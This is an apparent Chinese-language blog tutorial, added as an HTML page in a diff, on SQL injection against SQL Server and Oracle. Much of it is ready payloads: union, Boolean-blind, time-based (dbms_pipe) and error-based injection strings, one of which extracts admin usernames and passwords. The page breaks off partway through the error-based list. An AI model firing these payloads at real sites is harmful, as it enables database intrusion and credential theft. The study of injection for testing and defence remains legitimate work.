@@ -1,0 +1,896 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.ico">
+  <link rel="icon" href="/img/favicon.ico">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#8c9ae6">
+  <meta name="author" content="HackerTerry">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="SQL server和Oracle数据库注入简介ms SQL是指微软的SQL Server数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。 Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。它是在数据库领域一直处于领先地位的产品">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入（三）--SQL server和Oracle注入">
+<meta property="og:url" content="https://rookieterry.github.io/2021/10/05/SQL%E6%B3%A8%E5%85%A5%EF%BC%88%E4%B8%89%EF%BC%89-SQL-server%E5%92%8COracle%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="HackerTerry&#39;s Blog">
+<meta property="og:description" content="SQL server和Oracle数据库注入简介ms SQL是指微软的SQL Server数据库服务器，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个数据库管理系统，用于建立、使用和维护数据库。 Oracle Database，又名Oracle RDBMS，或简称Oracle。是甲骨文公司的一款关系数据库管理系统。它是在数据库领域一直处于领先地位的产品">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-10-05T09:54:34.000Z">
+<meta property="article:modified_time" content="2022-09-16T06:51:24.861Z">
+<meta property="article:author" content="HackerTerry">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>SQL注入（三）--SQL server和Oracle注入 - HackerTerry&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rookieterry.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":"UA-241125581-1","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript('https://www.google-analytics.com/analytics.js', function() {
+          window.ga = window.ga || function() { (ga.q = ga.q || []).push(arguments) };
+          ga.l = +new Date;
+          ga('create', 'UA-241125581-1', 'auto');
+          ga('send', 'pageview');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>HackerTerry&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/hacker.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="SQL注入（三）--SQL server和Oracle注入"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        HackerTerry
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2021-10-05 17:54" pubdate>
+          星期二, 十月 5日 2021, 5:54 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          5.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          48 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SQL注入（三）--SQL server和Oracle注入</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2 小时前
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="SQL-server和Oracle数据库注入"><a href="#SQL-server和Oracle数据库注入" class="headerlink" title="SQL server和Oracle数据库注入"></a>SQL server和Oracle数据库注入</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>ms SQL是指微软的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/SQL">SQL Server</a><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%8D%E5%8A%A1%E5%99%A8">数据库服务器</a>，它是一个数据库平台，提供数据库的从服务器到终端的完整的解决方案，其中数据库服务器部分，是一个<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/1239101">数据库管理系统</a>，用于建立、使用和维护数据库。</p>
+<p>Oracle Database，又名Oracle RDBMS，或简称Oracle。是<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%94%B2%E9%AA%A8%E6%96%87%E5%85%AC%E5%8F%B8/430115">甲骨文公司</a>的一款<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/11032386">关系数据库管理系统</a>。它是在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是目前世界上流行的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93/1237340">关系数据库</a>管理系统，系统<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%80%A7/6931884">可移植性</a>好、使用方便、功能强，适用于各类大、中、小<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%BE%AE%E6%9C%BA/5511409">微机</a>环境。它是一种高效率的、可靠性好的、适应高<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%90%9E%E5%90%90%E9%87%8F/157092">吞吐量</a>的数据库方案。</p>
+<p><strong>注意：SQL server的最高权限是sa，Oracle的最高权限是dba。扩展：Windows的最高权限是system（不是admin！），Linux的最高权限是root。</strong></p>
+<h2 id="注入方式"><a href="#注入方式" class="headerlink" title="注入方式"></a>注入方式</h2><h3 id="SQL-server"><a href="#SQL-server" class="headerlink" title="SQL server"></a>SQL server</h3><h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>1.老规矩，先判断是否存在注入点。</p>
+<p>2.用order by猜列数，注意联合查询不会显示重复内容，所以有时要在union后面加all。</p>
+<p>3.联合查询找回显位，注意这里有些不一样，因为SQL server需要指定数据类型，所以判断时需要加单引号。例如：<code>?id=1&#39; union select null,&#39;null&#39;,null #</code>假设有三列，这里猜测第二个为回显位，则用单引号包围第二个null。如果网页回显null，则说明第二个是回显位。多个回显位以此类推。</p>
+<p>4.爆库</p>
+<p>例如：<code>?id=1&#39; union select null,(select db_name),null #</code></p>
+<p>5.爆表</p>
+<p>例如：<code>?id=1&#39; union select null,(select top 1 字段名 from 库名.dbo.sysobjects where xtype=&#39;u&#39;,null #</code></p>
+<p>其中sysobjects是SQL server独有表,u代表用户创建的表。</p>
+<p>6.爆字段</p>
+<p>例如：<code>?id=1&#39; union select null,(select top 1 col_name(object_id(&#39;表名&#39;),n) from sysobjects,null #</code></p>
+<p>其中n代表第几列，一般第一列是id。</p>
+<p>7.爆值</p>
+<p>例如：<code>?id=1&#39; union select null,(select top 1 字段名 from 表名),null #</code></p>
+<p><em>扩展：</em></p>
+<p><em>查看当前数据库版本：</em><code>?id=1&#39; union select null,(select @@version),null #</code></p>
+<h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><h4 id="其它方式"><a href="#其它方式" class="headerlink" title="其它方式"></a>其它方式</h4><p>sqlmap一把梭，或者超级SQL注入工具。</p>
+<h3 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h3><h4 id="联合查询注入-1"><a href="#联合查询注入-1" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><p>1.老规矩，先判断是否存在注入点。</p>
+<p>2.用order by猜列数，注意联合查询不会显示重复内容，所以有时要在union后面加all。</p>
+<p>3.联合查询找回显位，注意这里有些不一样，虽然Oracle也需要指定数据类型，判断方法与SQL server相同，但是Oracle规定每次查询时必须跟随表名。例如：<code>?id=1&#39; union select null,&#39;null&#39;,null from dual#</code></p>
+<p>其中dual是Oracle独有表。</p>
+<p>4.爆库</p>
+<p>例如：<code>?id=1&#39; union select null,(select instance_name from V$INSTANCE),null from dual #</code></p>
+<p>5.爆表</p>
+<p>例如：<code>?id=1&#39; union select null,(select table_name from user_tables where rownum=1 and like &#39;%关键词%&#39;),null from dual #</code></p>
+<p><strong>注意要加rownum&#x3D;1，因为Oracle每次只能显示一条数据。关键词可能是user,admin之类的敏感词。</strong></p>
+<p>6.爆字段</p>
+<p>例如：<code>?id=1&#39; union select null,(select column_name from user_tab_columns where rownum=1 and table_name=&#39;表名&#39;),null from dual #</code></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select null,(select column_name from user_tab_columns where rownum=1 and table_name=&#x27;</span>表名<span class="hljs-string">&#x27; and column_name not in (&#x27;</span>字段名<span class="hljs-number">1</span><span class="hljs-string">&#x27;,&#x27;</span>字段名<span class="hljs-number">2</span><span class="hljs-string">&#x27;,...,&#x27;</span>字段名n<span class="hljs-string">&#x27;)),null from dual #</span><br></code></pre></td></tr></table></figure>
+
+<p>7.爆值</p>
+<p>例如：<code>?id=1&#39; union select null,(select 字段名1，字段名2,...,字段名n from &quot;表名&quot;),null from dual #</code></p>
+<p><strong>注意实际表名要加双引号。</strong></p>
+<p><em>扩展：</em></p>
+<p><em>查看当前数据库版本：</em><code>?id=1&#39; union select null,(select banner from sys.v_$version where rownum=1),null from dual #</code></p>
+<h4 id="布尔盲注-1"><a href="#布尔盲注-1" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>0x01 利用decode函数盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">decode(字段或字段的运算，值<span class="hljs-number">1</span>，值<span class="hljs-number">2</span>，值<span class="hljs-number">3</span>）<br></code></pre></td></tr></table></figure>
+
+<p>这个函数运行的结果是，当字段或字段的运算的值等于值1时，该函数返回值2，否则返回3。</p>
+<p>当然值1，值2，值3也可以是表达式，这个函数使得某些sql语句简单了许多。</p>
+<p>使用方法：</p>
+<p>比较大小:<code>select decode(sign(变量1-变量2),-1,变量1,变量2) from dual; --取较小值</code></p>
+<p>其中sign()函数根据某个值是0、正数还是负数，分别返回0、1、-1。</p>
+<p>所以在注入中的应用如下：</p>
+<p>判断当前用户： <code>?username=SMITH&#39; and 1=(select decode(user,&#39;SCOTT&#39;,1,0) from dual) --</code></p>
+<p>如果是SCOTT用户则返回1，不是则返回0.</p>
+<p>当然也可以用字符逐个猜解，利用到substr()函数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?username<span class="hljs-operator">=</span>SMITH<span class="hljs-string">&#x27; and 1=(select decode(substr(user,1,1),&#x27;</span>S<span class="hljs-string">&#x27;,1,0) from dual) --</span><br></code></pre></td></tr></table></figure>
+
+<p>获取当前用户</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)<br></code></pre></td></tr></table></figure>
+
+<p>获取当前版本</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>
+
+<p>获取当前admin表的帐号和密码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">select</span> username<span class="hljs-operator">||</span>password <span class="hljs-keyword">from</span> admin)<br></code></pre></td></tr></table></figure>
+
+<p>获取字符长度</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> length(<span class="hljs-keyword">user</span>) <span class="hljs-keyword">from</span> dual <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p>把上述语句替换开头的<code>user</code>即可。</p>
+<p>例如，逐个猜解用户名：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">2</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;Y&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br><br>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br><br>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;T&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br><br>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;E&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br><br>(<span class="hljs-keyword">select</span> decode(substr(<span class="hljs-keyword">user</span>,<span class="hljs-number">6</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;N&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">from</span> dual) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p>可以辅助burpsuite半自动注入。</p>
+<p>0x02 利用instr函数盲注</p>
+<p>instr函数可以从一个字符串中查找指定子串的位置。例如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> instr(<span class="hljs-string">&#x27;abcdefgh&#x27;</span>,<span class="hljs-string">&#x27;de&#x27;</span>) position <span class="hljs-keyword">from</span> dual<br></code></pre></td></tr></table></figure>
+
+<p>返回结果是4，因为从1开始算，d排第四所以返回4。</p>
+<p>在注入中的应用： <code>?id=1 and 1=(instr((select user from dual),&#39;SYS&#39;)) --</code></p>
+<p>0x03 逐字猜解（和以前一样，这里不再赘述）</p>
+<h4 id="时间盲注-1"><a href="#时间盲注-1" class="headerlink" title="时间盲注"></a>时间盲注</h4><p>Oracle的时间盲注通常使用DBMS_PIPE.RECEIVE_MESSAGE()，而另外一种便是decode()与高耗时SQL操作的组合，当然也可以是case，if 等方式与高耗时操作的组合，这里的高耗时操作指的是，例如：<code>(select count(*) from all_objects)</code>，对数据库中大量数据进行查询或其他处理的操作，这样的操作会耗费较多的时间，然后通过这个方式来获取数据。这种方式也适用于其他数据库。</p>
+<p>0x01 利用DBMS_PIPE.RECEIVE_MESSAGE函数盲注</p>
+<p>DBMS_LOCK.SLEEP()函数可以让一个过程休眠很多秒，但使用该函数存在许多限制。</p>
+<p>首先，不能直接将该函数注入子查询中，因为Oracle不支持堆叠查询(stacked query)。其次，只有数据库管理员才能使用DBMS_LOCK包。</p>
+<p>在Oracle PL&#x2F;SQL中有一种更好的办法，可以使用下面的指令以内联方式注入延迟：<code>dbms_pipe.receive_message(&#39;RDS&#39;, 10)</code></p>
+<p>DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。DBMS_LOCK.SLEEP()与之相反，它是一个可以用在SQL语句中的函数。</p>
+<p>在注入中的应用：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span> dbms_pipe.receive_message(<span class="hljs-string">&#x27;RDS&#x27;</span>, <span class="hljs-number">10</span>)<span class="hljs-comment">--</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>dbms_pipe.receive_message(<span class="hljs-string">&#x27;RDS&#x27;</span>, <span class="hljs-number">10</span>)<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p>如果页面延时10秒返回，即存在注入。这里可以暂时理解成DBMS_PIPE.RECEIVE_MESSAGE(‘任意值’,延迟时间)。</p>
+<p>0x02 利用decode函数盲注</p>
+<p>decode不仅可以在布尔盲注中运用，也可以用在延迟盲注中。</p>
+<p>在decode注入里加入延时语句。这里加入了我们的dbms_pipe.receive_message函数。</p>
+<p>例如：<code>?id=1 and 1=(select decode(substr(user,1,1),&#39;S&#39;,dbms_pipe.receive_message(&#39;RDS&#39;,5),0) from dual) --</code></p>
+<p>当然，这里延迟的操作不一定用延迟函数，也可以使用花费更多时间去查询所有数据库的条目。</p>
+<p>例如:<code>?id=1 and 1=(select decode(substr(user,1,1),&#39;S&#39;,(select count(*) from all_objects),0) from dual) and &#39;1&#39;=&#39;1&#39;</code></p>
+<p>通过这种明显时间差也能判断注入表达式的结果。</p>
+<h4 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h4><p>使用报错注入需要使用类似 1&#x3D;[报错语句]，1&gt;[报错语句]，使用比较运算符这样的方式进行报错注入（MYSQL仅使用函数报错即可），类似mssql报错注入的方式。</p>
+<p><strong>utl_inaddr.get_host_name()进行报错注入</strong></p>
+<p>utl_inaddr.get_host_address 本意是获取ip 地址，但是如果传递参数无法得到解析就会返回一个oracle 错误并显示传递的参数。</p>
+<p>我们传递的是一个sql 语句所以返回的就是语句执行的结果。oracle 在启动之后，把一些系统变量都放置到一些特定的视图当中，可以利用这些视图获得想要的东西。</p>
+<p>例如，爆出当前用户： <code>?id=1 and 1=utl_inaddr.get_host_name((select user from dual))--</code></p>
+<p><strong>ctxsys.drithsx.sn()进行报错注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span>ctxsys.drithsx.sn(<span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>XMLType()进行报错注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">upper</span>(XMLType(chr(<span class="hljs-number">60</span>)<span class="hljs-operator">%</span><span class="hljs-number">7</span>c<span class="hljs-operator">%</span><span class="hljs-number">7</span>cchr(<span class="hljs-number">58</span>)<span class="hljs-operator">%</span><span class="hljs-number">7</span>c<span class="hljs-operator">%</span><span class="hljs-number">7</span>c(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)<span class="hljs-operator">%</span><span class="hljs-number">7</span>c<span class="hljs-operator">%</span><span class="hljs-number">7</span>cchr(<span class="hljs-number">62</span>))) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>dbms_xdb_version.checkin()进行报错注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> dbms_xdb_version.checkin((<span class="hljs-keyword">select</span> banner <span class="hljs-keyword">from</span> sys.v_$version <span class="hljs-keyword">where</span> rownum<span class="hljs-operator">=</span><span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>bms_xdb_version.makeversioned()进报错注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> dbms_xdb_version.makeversioned((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>dbms_xdb_version.uncheckout()进行报错注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> dbms_xdb_version.uncheckout((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>dbms_utility.sqlid_to_sqlhash()进行报错注入</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">SELECT</span> dbms_utility.sqlid_to_sqlhash((<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">from</span> dual)) <span class="hljs-keyword">from</span> dual) <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span> <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>ordsys.ord_dicom.getmappingxpath()进行报错注入</strong></p>
